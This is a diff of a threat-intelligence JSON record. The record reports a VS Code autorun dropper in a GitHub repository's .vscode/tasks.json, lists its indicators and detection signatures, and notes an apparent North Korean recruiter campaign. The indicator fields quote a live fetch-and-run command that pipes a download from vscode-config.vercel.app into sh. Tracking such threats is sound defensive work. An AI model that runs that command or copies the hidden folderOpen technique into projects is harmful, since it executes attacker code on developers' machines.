@@ -17,12 +17,12 @@
     "evidence_locations": ".vscode/tasks.json:0; Truffle/scripts/devChain.js:1; Truffle/scripts/devChain.js:6; Truffle/scripts/deployContract.js:1; Truffle/scripts/deployContract.js:6",
     "c2_hosts": "vscode-config.vercel.app",
     "iocs": "vscode-config.vercel.app; https://vscode-config.vercel.app/task/mac?token=99; https://vscode-config.vercel.app/task/linux?token=99; https://vscode-config.vercel.app/task/windows?token=99; curl 'https://vscode-config.vercel.app/task/mac?token=99' | sh; .vscode/tasks.json",
-    "matched_signatures": "\"/task/windows?token=\" filename:tasks.json; \"/task/mac?token=\" filename:tasks.json",
-    "reasons": "Shares a confirmed-malware code signature ['\"/task/windows?token=\" filename:tasks.json', '\"/task/mac?token=\" filename:tasks.json'] | Tier-2 confirmed (bash score 11)",
-    "osm_status": "submitted",
-    "osm_threat_id": "2188b6e6-905c-4c5f-91fb-2aa82c46742c",
-    "first_seen": "hunt-20261004T210412Z",
-    "last_seen": "hunt-20261004T210412Z",
+    "matched_signatures": "task/mac?token=; task/windows?token=",
+    "reasons": "Shares a confirmed-malware code signature ['task/mac?token=', 'task/windows?token='] | Tier-2 confirmed (bash score 11)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20261005T094859Z",
+    "last_seen": "hunt-20261005T094859Z",
     "evidence_file": "repositories/mentarishub121_tokenpresaleapp.json",
     "reviewer_decision": "",
     "notes": ""
@@ -76,7 +76,7 @@
     "report_type": "repository",
     "resource_identifier": "https://github.com/mentarishub121/tokenpresaleapp",
     "version_info": "all",
-    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from vscode-config.vercel.app and executes it (.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: vscode-config.vercel.app.\nCampaign GW-C-a3717cc8: one of 10 confirmed repos across 10 accounts sharing the dropper URL shape task/{os}?token=. Payload served from 6 distinct hosts, including coreviewer.vercel.app, task-hrec.vercel.app, thopywork.vercel.app, vscode-config.vercel.app, vscode-production-setting.ve.\nAttribution: we assess this repository as PROBABLE North Korea 'Contagious Interview' activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun; Payload host is curated known-DPRK / Contagious-Interview infrastructure: vscode-config.vercel.app.\nFound by GitHub code search for a confirmed malware signature: \"/task/windows?token=\" filename:tasks.json; \"/task/mac?token=\" filename:tasks.json.\nConfirmed by static analysis; the code was read, never executed.",
+    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from vscode-config.vercel.app and executes it (.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: vscode-config.vercel.app.\nCampaign GW-C-a3717cc8: one of 10 confirmed repos across 10 accounts sharing the dropper URL shape task/{os}?token=. Payload served from 6 distinct hosts, including coreviewer.vercel.app, task-hrec.vercel.app, thopywork.vercel.app, vscode-config.vercel.app, vscode-production-setting.ve.\nAttribution: we assess this repository as PROBABLE North Korea 'Contagious Interview' activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun; Payload host is curated known-DPRK / Contagious-Interview infrastructure: vscode-config.vercel.app.\nFound by GitHub code search for a confirmed malware signature: task/mac?token=; task/windows?token=.\nConfirmed by static analysis; the code was read, never executed.",
     "payload_description": "Malicious payload found in: .vscode/tasks.json\n- Outbound: fetch-and-run. It downloads code from vscode-config.vercel.app and executes it (.vscode/tasks.json).\n- .vscode/tasks.json: VS Code task with runOn: folderOpen; runs the moment the folder is opened, no install or click needed\n- Attacker hosts: vscode-config.vercel.app",
     "publisher": "mentarishub121",
     "severity_level": "critical",
@@ -93,7 +93,7 @@
     "evidence_references": "https://github.com/mentarishub121/tokenpresaleapp/blob/e3b5b9639e8f8830b1f7a7944ffcc842e4a299ce/.vscode/tasks.json\nhttps://github.com/mentarishub121/tokenpresaleapp/blob/e3b5b9639e8f8830b1f7a7944ffcc842e4a299ce/Truffle/scripts/devChain.js#L1\nhttps://github.com/mentarishub121/tokenpresaleapp/blob/e3b5b9639e8f8830b1f7a7944ffcc842e4a299ce/Truffle/scripts/devChain.js#L6\nhttps://github.com/mentarishub121/tokenpresaleapp/blob/e3b5b9639e8f8830b1f7a7944ffcc842e4a299ce/Truffle/scripts/deployContract.js#L1\nhttps://github.com/mentarishub121/tokenpresaleapp/blob/e3b5b9639e8f8830b1f7a7944ffcc842e4a299ce/Truffle/scripts/deployContract.js#L6",
     "verified_iocs": "vscode-config.vercel.app\nhttps://vscode-config.vercel.app/task/mac?token=99\nhttps://vscode-config.vercel.app/task/linux?token=99\nhttps://vscode-config.vercel.app/task/windows?token=99\ncurl 'https://vscode-config.vercel.app/task/mac?token=99' | sh\n.vscode/tasks.json",
     "contributors": [],
-    "first_seen": "2026-10-04T21:04:12Z",
-    "last_seen": "2026-10-04T21:04:12Z"
+    "first_seen": "2026-10-05T09:48:59Z",
+    "last_seen": "2026-10-05T09:48:59Z"
   }
 }
